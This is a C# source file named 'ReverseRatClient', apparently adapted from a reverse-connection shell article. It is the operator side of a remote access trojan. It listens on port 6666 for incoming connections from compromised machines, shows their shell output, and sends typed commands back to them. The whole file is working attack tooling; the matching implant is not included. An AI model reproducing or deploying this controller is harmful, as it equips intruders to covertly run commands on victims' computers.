//
//Reverse Connection Client Listener by Paul Chin
//original version taken from http://www.codeproject.com/Articles/20250/Reverse-Connection-Shell
//
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;            //for Streams
using System.Threading;     //to run commands concurrently
using System.Net;           //for IPEndPoint



namespace ReverseRatClient
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForServer;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        StringBuilder strInput;
        Thread th_StartListen,th_RunClient;
      

        public Form1()
        {
            InitializeComponent();
        }

        

        private void Form1_Shown(object sender, EventArgs e)
        {
            th_StartListen = new Thread(new ThreadStart(StartListen));
            th_StartListen.Start();
            textBox2.Focus();
        }

        private void StartListen()
        {
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 6666);
            tcpListener.Start();
            toolStripStatusLabel1.Text = "Listening on port 6666 ...";
            for (;;)
            {
                socketForServer = tcpListener.AcceptSocket();
                IPEndPoint ipend = (IPEndPoint)socketForServer.RemoteEndPoint;
                toolStripStatusLabel1.Text = "Connection from " + IPAddress.Parse(ipend.Address.ToString());
                th_RunClient = new Thread(new ThreadStart(RunClient));
                th_RunClient.Start();
            }
        }

        private void RunClient()
        {
            networkStream = new NetworkStream(socketForServer);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);

            
            strInput = new StringBuilder();

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\r\n");
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
                Application.DoEvents();
                DisplayMessage(strInput.ToString());
                strInput.Remove(0, strInput.Length);
            }
          
            
        }

        private void Cleanup()
        {
            try
            {
                streamReader.Close();
                streamWriter.Close();
                networkStream.Close();
                socketForServer.Close();
            }
            catch (Exception err) { }
            toolStripStatusLabel1.Text = "Connection Lost";
        }

        

        private delegate void DisplayDelegate(string message);

        private void DisplayMessage(string message)
        {
            if (textBox1.InvokeRequired)
            {
                Invoke(new DisplayDelegate(DisplayMessage), new object[] { message });
            }
            else
            {
                textBox1.AppendText(message);
            }
           
        }

        
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {
                    strInput.Append(textBox2.Text.ToString());
                    streamWriter.WriteLine(strInput);
                    streamWriter.Flush();
                    strInput.Remove(0, strInput.Length);
                    if (textBox2.Text == "exit") Cleanup();
                    if (textBox2.Text == "terminate") Cleanup();
                    if (textBox2.Text == "cls") textBox1.Text = "";
                    textBox2.Text = "";
                }
            }
            catch (Exception err) { }
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

       
      
      
    }
}